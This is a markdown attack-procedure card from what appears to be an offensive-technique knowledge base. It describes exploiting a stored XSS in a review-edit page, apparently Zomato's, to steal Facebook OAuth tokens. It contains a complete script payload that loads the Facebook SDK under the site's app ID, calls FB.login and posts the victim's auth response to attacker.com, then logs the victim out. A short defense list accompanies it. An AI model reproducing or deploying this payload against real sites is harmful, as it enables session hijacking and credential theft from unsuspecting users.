---
id: proc-632017-02
tags:
  - xss
  - execution
type: procedure
tools:
  - '[[tools/Facebook-JavaScript-SDK]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/xss-payload-fb-token-steal]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:49.968Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-via-Review-Edit

## Summary

This procedure triggers the stored XSS payload by editing the submitted review, executing JavaScript in the victim's browser to steal OAuth tokens.

## Description

After submission, navigating to the review and clicking 'Edit' renders the 'with_tags_data' content unsafely, executing the stored script. For token theft, the payload loads the Facebook SDK and uses FB.login to capture authResponse. Prerequisites: Submitted review with payload; victim's browser session. Outcome: Arbitrary JS runs, tokens exfiltrated.

## Requirements

1. Access to the review page (e.g., via link)
2. Victim's browser with Facebook/Google login
3. Attacker server to receive stolen data
4. Review ID from submission

## Defense

Defensive measures and detection strategies:

- Escape user input in edit views (e.g., via DOMPurify)
- Content Security Policy (CSP) blocking inline scripts
- Rate limiting on review edits
- JS error logging for anomalous prompts/requests

## Objectives

1. Execute stored JavaScript
2. Steal authentication tokens
3. Exfiltrate data to attacker

## Instructions

### Step 1: Navigate to Review and Edit

**Context**: Load the review page and initiate edit to trigger rendering of 'with_tags_data'.

**Command** (No CLI; browser action):

> Click 'Edit' button; payload executes immediately.

### Step 2: Execute Advanced Token-Stealing Payload

**Context**: If using FB token steal, ensure SDK loads and posts data.

**Command** ([[commands/xss-payload-fb-token-steal]]):
```html
<script>// load fb js-sdk (function(d, s, id){ var js, fjs = d.getElementsByTagName(s)[0]; if(d.getElementById(id)){return;}  js = d.createElement(s); js.id = id;  js.src ="//connect.facebook.net/en_US/sdk.js";  fjs.parentNode.insertBefore(js, fjs); }(document,'script','facebook-jssdk')); window.fbAsyncInit=function(){ FB.init({ appId:'288523881080',// zomato fb app id xfbml:true, version:'v3.1' });  //get auth response ( accessToken and signedRequest ) FB.login(function(){  $.post('https://attacker.com/tokens.php',FB.getAuthResponse())});// send token and signed_request to attacker document.location.href ='https://www.zomato.com/logout';// logout from victims's account });  }</script>
```

> Expected: FB SDK loads, login prompts if needed, tokens POST to attacker.com; session logs out.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/xss-payload-fb-token-steal]]

## Tools Used

- [[tools/Facebook-JavaScript-SDK]]

## Tags

- [[xss]]
- [[Execution]]
